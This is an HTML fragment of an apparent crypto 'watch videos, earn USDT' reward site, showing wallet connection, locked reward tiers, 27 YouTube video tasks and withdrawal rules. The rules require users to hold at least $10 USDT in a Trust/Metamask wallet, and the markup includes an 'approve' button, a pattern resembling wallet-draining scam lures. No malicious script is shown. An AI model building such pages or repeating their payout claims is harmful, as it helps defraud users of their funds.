            <button id="taskBtn" class="approve-btn" disabled>View Tasks</button>
     
              <div class="small" id="claimHint" style="margin-top:4px;"></div>
        </div>

<button id="connectBtnCard" class="connect">Connect Wallet</button> 
         </div>
   





    




<!-- ===== UPCOMING REWARD #2 ===== -->
<div class="reward-card reward-silver" style="margin-top:22px;">

  <div class="reward-left">
    <div class="reward-tag">Reward #2</div>
    <div class="wallet-icon-base">
      <img src="logo.png" alt="USDT">
    </div>
    <span class="wallet-subline">USDT</span>
  </div>

  <div class="reward-center">
    <div class="reward-amount">$25</div>
    <div class="reward-label">Level 2 Bonus</div>
<br>
    <div class="reward-desc">
      Complete the next set of tasks to unlock this reward.
    </div>

    <div class="reward-lock-badge">
      üîí Locked - Complete Task #1
    </div>
  </div>

  <div class="reward-right">
    <button class="btn btn-claim" disabled>Locked</button>
  </div>
</div>


<!-- ===== UPCOMING REWARD #3 ===== -->
<div class="reward-card reward-gold" style="margin-top:22px;">

  <div class="reward-left">
    <div class="reward-tag">Reward #3</div>
    <div class="wallet-icon-base">
      <img src="logo.png" alt="USDT">
    </div>
    <span class="wallet-subline">USDT</span>
  </div>

  <div class="reward-center">
    <div class="reward-amount">$50</div>
    <div class="reward-label">Level 3 Bonus</div>
<br>

    <div class="reward-desc">
      Complete the next set of tasks to unlock this reward.
    </div>

    <div class="reward-lock-badge">
      üîí Locked - Complete Task #2
    </div>
  </div>

  <div class="reward-right">
    <button class="btn btn-claim" disabled>Locked</button>
  </div>
</div>

    


    <!-- ===== UPCOMING REWARD #4 ===== -->
<div class="reward-card max-tier-card" style="margin-top:22px;">
  <div class="max-tier-ribbon">MAX&nbsp;TIER</div>
<div class="reward-left">
    <div class="reward-tag">Reward #4</div>
    <div class="wallet-icon-base">
      <img src="logo.png" alt="USDT">
    </div>
    <span class="wallet-subline">USDT</span>
  </div>

  <div class="reward-center">
    <div class="reward-amount fire-amount">$100</div>

    <div class="reward-label">Level 4 Bonus</div>
<br>

    <div class="reward-desc">
      Complete the next set of tasks to unlock this reward.
    </div>

    <div class="reward-lock-badge">
      üîí Locked - Complete Task #3
    </div>
  </div>

  <div class="reward-right">
    <button class="btn btn-claim" disabled>Locked</button>
  </div>
</div>

   </div>  
    

    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
    <div id="taskPage">


<br>   
    <div class="center-box">
  <button id="backToRewardsBtn" class="btn-primary">
    ‚Üê Back to Reward
  </button>
</div>
<br>
   
<div class="center-text">
  <h2>Reward Tasks</h2>
  
</div>
  <!-- ===== TASK PROGRESS BAR ===== -->
<div class="task-progress">
  <div class="task-progress-bar">
    <div id="taskProgressFill"></div>
  </div>
  <div id="taskProgressText" class="task-progress-text">
    0 / 0 completed
  </div>
</div>


      
<br>    
      
<!-- ===== BALANCE BOX (TASK PAGE ONLY) ===== -->
<div class="wallet-status-card" id="balanceBox">
  <div class="wallet-status-row">
    <span class="status-dot"></span>
    <strong>Earnings Summary</strong>
  </div>

  <div class="wallet-meta">
    <span class="user-pill">User ID: <span id="balUserId">‚Äî</span></span>
    <span class="address-pill mono" id="balAddress">‚Äî</span>
    <span class="network-pill">Tasks: <span id="balTasks">0</span></span>
  </div>


<div class="withdraw-rules">
  <div class="withdraw-rules-title">Important Withdrawal Rules</div>
  <ul>     
  <li>Your <strong>Trust/Metamask</strong> wallet must be active wallet to receive withdrawal </li>
  <li>You must have minimum <strong>$10 USDT</strong> in your <strong>Trust/Metamask</strong> wallet to receive withdrawal.</li>
  <li> We do not payment to inactive or dead wallet.</strong></li>    
  <li>Processing time: up to <strong>2 hours</strong></li>
  </ul>
</div>


  

<div class="wallet-status-card" id="withdrawHistoryBox">
  <div class="wallet-status-row">
    <span class="status-dot"></span>
    <strong>Withdraw History</strong>
  </div>

  <div id="withdrawHistoryList" class="small">
    No withdrawals yet.
  </div>
</div>







  
<div class="earnings-box">
  <div class="earnings-label">Total Earnings</div>
  <div class="earnings-amount">
    <span class="earnings-currency">$</span>
    <span id="balTotal">0</span>
  </div>
 <button
    id="withdrawBtn"
    class="withdraw-btn"
    disabled
  >
    Withdraw
  </button>

  <div id="withdrawHint" class="withdraw-hint">
    Minimum withdrawal: $10
  </div>
  
</div>


  
</div>




      






      <!-- Task 1: video -->
    <div class="task-section" data-task="task1" data-order="1">

 <div class="task-amount-badge">+$1</div>
        <h3>Watch the intro video of USDTOFFERS</h3>
        <p>
          Watch this video to understand how usdtoffers.com and the reward system works.
        </p>
        <div class="video-wrapper">
   
      <!-- Replace src with your own embedded video later -->
<iframe
  id="task1Player"
  src="https://www.youtube.com/embed/88cJdYXXAUs?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
  title="GoPro Intro"
  allow="autoplay; encrypted-media"
  allowfullscreen>
</iframe>

<div class="video-progress">
  <svg class="progress-ring" width="44" height="44">
    <circle
      class="ring-bg"
      cx="22"
      cy="22"
      r="18"
    />
    <circle
      id="task1Ring"
      class="ring-progress"
      cx="22"
      cy="22"
      r="18"
    />
  </svg>
  <div id="task1Timer" class="ring-text">00:00</div>
</div>


        </div>
        <div class="task-actions">

          
        <button class="task-btn" disabled>Watch full video</button>
<button class="task-claim-btn" data-task="task1" disabled>
  Claim $1
</button>

        
        </div>
      </div>





<!-- Task 5: video -->
<div class="task-section" data-task="task5" data-order="2">

  <div class="task-amount-badge">+$0.40</div>
  <h3>Watch GoPro Awards</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task5Player"
      src="https://www.youtube.com/embed/SsYgqqf-Kyk?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task5Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task5Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task5" disabled>
  Claim $0.40
</button>

  </div>
</div>





<!-- Task 6: video -->
<div class="task-section" data-task="task6" data-order="3">

  <div class="task-amount-badge">+$0.55</div>
  <h3>Watch Red Bull's Mount Everest Adventure</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
    

    <iframe
      id="task6Player"
      src="https://www.youtube.com/embed/cjZvFY6__qw?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"

      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task6Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task6Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
   <button class="task-claim-btn" data-task="task6" disabled>
  Claim $0.55
</button>

  </div>
</div>




<!-- Task 7: video -->
<div class="task-section" data-task="task7" data-order="4">

  <div class="task-amount-badge">+$0.75</div>
  <h3>Watch Red Bull Rampage</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
    

    <iframe
      id="task7Player"
      src="https://www.youtube.com/embed/LTt4br9KRZc?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task7Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task7Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
 <button class="task-claim-btn" data-task="task7" disabled>
  Claim $0.75
</button>

  </div>
</div>






<!-- Task 8: video -->
<div class="task-section" data-task="task8" data-order="5">

  <div class="task-amount-badge">+$0.35</div>
  <h3>Red Bull's Kayaking down the ICE WALL</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">


    <iframe
      id="task8Player"
      src="https://www.youtube.com/embed/A_5Nd3vAG9k?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task8Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task8Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
    <button class="task-claim-btn" data-task="task8" disabled>
  Claim $0.35
</button>

  </div>
</div>


      

<!-- Task 9: video -->
<div class="task-section" data-task="task9" data-order="6">

  <div class="task-amount-badge">+$0.35</div>
  <h3>SpaceX‚Äôs Crew Demo-1 | Welcome Ceremony </h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
  

    <iframe
      id="task9Player"
      src="https://www.youtube.com/embed/yIrpGNdHk5g?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task9Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task9Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
   <button class="task-claim-btn" data-task="task9" disabled>
  Claim $0.35
</button>

  </div>
</div>



<!-- Task 10: video -->
<div class="task-section" data-task="task10" data-order="7">

  <div class="task-amount-badge">+$0.90</div>
  <h3>SpaceX CRS-8 Dragon Launch</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
    

    <iframe
      id="task10Player"
      src="https://www.youtube.com/embed/C_Gmgj3N_Z0?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task10Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task10Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
 <button class="task-claim-btn" data-task="task10" disabled>
  Claim $0.90
</button>

  </div>
</div>




<!-- Task 11: video -->
<div class="task-section" data-task="task11" data-order="8">

  <div class="task-amount-badge">+$0.20</div>
  <h3>Watch GoPro MAX2 | Oregon Dunes</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task11Player"
      src="https://www.youtube.com/embed/yRR_fBtSIbI?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task11Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task11Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task11" disabled>
  Claim $0.20
</button>

  </div>
</div>



<!-- Task 12: video -->
<div class="task-section" data-task="task12" data-order="9">

  <div class="task-amount-badge">+$0.60</div>
  <h3>Watch The Season's Best GoPro POVs</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task12Player"
      src="https://www.youtube.com/embed/k12GHIJB92c?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task12Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task12Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task12" disabled>
  Claim $0.60
</button>

  </div>
</div>



      <!-- Task 13: video -->
<div class="task-section" data-task="task13" data-order="10">

  <div class="task-amount-badge">+$0.25</div>
  <h3>Sony Alpha 7 V Product Announcement </h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task13Player"
      src="https://www.youtube.com/embed/VxyFE5q6X0s?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task13Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task13Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task13" disabled>
  Claim $0.25
</button>

  </div>
</div>


<!-- Task 14: video -->
<div class="task-section" data-task="task14" data-order="11">

  <div class="task-amount-badge">+$0.20</div>
  <h3>Sony's G Master Technology</h3>
  <p>Watch this video to unlock the next reward step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task14Player"
      src="https://www.youtube.com/embed/uZqBzCaP_To?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task14Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task14Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task14" disabled>
  Claim $0.20
</button>

  </div>
</div>




<!-- Task 15: video -->
<div class="task-section" data-task="task15" data-order="12">

  <div class="task-amount-badge">+$0.35</div>
  <h3>Sony Alpha 7C II Product Announcement</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task15Player"
      src="https://www.youtube.com/embed/0YT2d3aUBL0?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task15Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task15Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task15" disabled>
  Claim $0.35
</button>

  </div>
</div>



<!-- Task 16: video -->
<div class="task-section" data-task="task16" data-order="13">

  <div class="task-amount-badge">+$0.15</div>
  <h3>DJI Mavic 3 Pro | 29,000 Feet Up Mount Everest</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task16Player"
      src="https://www.youtube.com/embed/0pIyIMqwu0E?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task16Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task16Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task16" disabled>
  Claim $0.15
</button>

  </div>
</div>



<!-- Task 17: video -->
<div class="task-section" data-task="task17" data-order="14">

  <div class="task-amount-badge">+$0.25</div>
  <h3>Red Bull's Most Extreme Flying Obstacle Course </h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task17Player"
      src="https://www.youtube.com/embed/cRienev1J3Q?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task17Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task17Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task17" disabled>
  Claim $0.25
</button>

  </div>
</div>


      
<!-- Task 18: video -->
<div class="task-section" data-task="task18" data-order="15">

  <div class="task-amount-badge">+$1</div>
  <h3>Red Bull Stalen Ros. Bicycle Rides (& fails) </h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task18Player"
      src="https://www.youtube.com/embed/v4tl9bD8tQI?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task18Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task18Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task18" disabled>
  Claim $1
</button>

  </div>
</div>



      <!-- Task 19: video -->
<div class="task-section" data-task="task19" data-order="16">

  <div class="task-amount-badge">+$0.20</div>
  <h3>MotoGP 2025 Austrian GP</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task19Player"
      src="https://www.youtube.com/embed/YuS6JfBxK20?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task19Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task19Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task19" disabled>
  Claim $0.20
</button>

  </div>
</div>


      

<!-- Task 20: video -->
<div class="task-section" data-task="task20" data-order="17">

  <div class="task-amount-badge">+$0.25</div>
  <h3>MotoGP 2025 British GP</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task20Player"
      src="https://www.youtube.com/embed/WchdIjVo4Qw?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task20Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task20Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task20" disabled>
  Claim $0.25
</button>

  </div>
</div>





<!-- Task 21: video -->
<div class="task-section" data-task="task21" data-order="18">

  <div class="task-amount-badge">+$0.15</div>
  <h3>FORMULA 1 2024 Canadian Grand Prix</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task21Player"
      src="https://www.youtube.com/embed/dLw1ao4-Akk?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task21Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task21Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task21" disabled>
  Claim $0.15
</button>

  </div>
</div>




<!-- Task 22: video -->
<div class="task-section" data-task="task22" data-order="19">

  <div class="task-amount-badge">+$0.25</div>
  <h3>A Guided Demo of Galaxy XR | Samsung</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task22Player"
      src="https://www.youtube.com/embed/J-FOSKnpu2Q?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task22Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task22Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task22" disabled>
  Claim $0.25
</button>

  </div>
</div>

      

<!-- Task 23: video -->
<div class="task-section" data-task="task23" data-order="20">

  <div class="task-amount-badge">+$0.20</div>
  <h3>Introducing Galaxy S25 Ultra | Galaxy AI</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task23Player"
      src="https://www.youtube.com/embed/3i1OB6wKYms?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task23Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task23Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task23" disabled>
  Claim $0.20
</button>

  </div>
</div>




<!-- Task 24: video -->
<div class="task-section" data-task="task24" data-order="21">

  <div class="task-amount-badge">+$0.25</div>
  <h3>Samsung Galaxy S25 Ultra Unboxing</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task24Player"
      src="https://www.youtube.com/embed/1DUFvBO3AOQ?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task24Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task24Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task24" disabled>
  Claim $0.25
</button>

  </div>
</div>



<!-- Task 25: video -->
<div class="task-section" data-task="task25" data-order="22">

  <div class="task-amount-badge">+$0.20</div>
  <h3>iPhone 17 Pro Max VS Samsung Galaxy S25 Ultra </h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task25Player"
      src="https://www.youtube.com/embed/Ajt3IxJoSwA?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task25Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task25Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task25" disabled>
  Claim $0.20
</button>

  </div>
</div>


<!-- Task 26: video -->
<div class="task-section" data-task="task26" data-order="23">

  <div class="task-amount-badge">+$0.25</div>
  <h3>Rolls-Royce | Phantom 'The Six Elements'</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task26Player"
      src="https://www.youtube.com/embed/PVNj7AQymxY?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task26Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task26Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task26" disabled>
  Claim $0.25
</button>

  </div>
</div>




<!-- Task 27: video -->
<div class="task-section" data-task="task27" data-order="24">

  <div class="task-amount-badge">+$0.25</div>
  <h3>The Largest PRIVATE JETS in The World</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task27Player"
      src="https://www.youtube.com/embed/801vCdFTt7g?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task27Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task27Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task27" disabled>
  Claim $0.25
</button>

  </div>
</div>


<!-- Task 28: video -->
<div class="task-section" data-task="task28" data-order="25">

  <div class="task-amount-badge">+$0.20</div>
  <h3>F-22 Raptor, The Most Lethal Fighter Jet Ever Built</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task28Player"
      src="https://www.youtube.com/embed/RRMpWijZMGo?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task28Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task28Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task28" disabled>
  Claim $0.20
</button>

  </div>
</div>



      <!-- Task 29: video -->
<div class="task-section" data-task="task29" data-order="26">

  <div class="task-amount-badge">+$0.25</div>
  <h3>F-22 Raptor Demo's First Ever Flare Show</h3>
  <p>Watch this video to unlock the next  step.</p>

  <div class="video-wrapper">
   

    <iframe
      id="task29Player"
      src="https://www.youtube.com/embed/NWxtuDEyK9g?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1&origin=https://usdtoffers.com"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>

    <div class="video-progress">
      <svg class="progress-ring" width="44" height="44">
        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
        <circle id="task29Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
      </svg>
      <div id="task29Timer" class="ring-text">00:00</div>
    </div>
  </div>

  <div class="task-actions">
    <button class="task-btn" disabled>Watch full video</button>
  <button class="task-claim-btn" data-task="task29" disabled>
  Claim $0.25
</button>

  </div>
</div>




<!-- Task 30: video -->
<div class="task-section" data-task="task30" data-order="27">

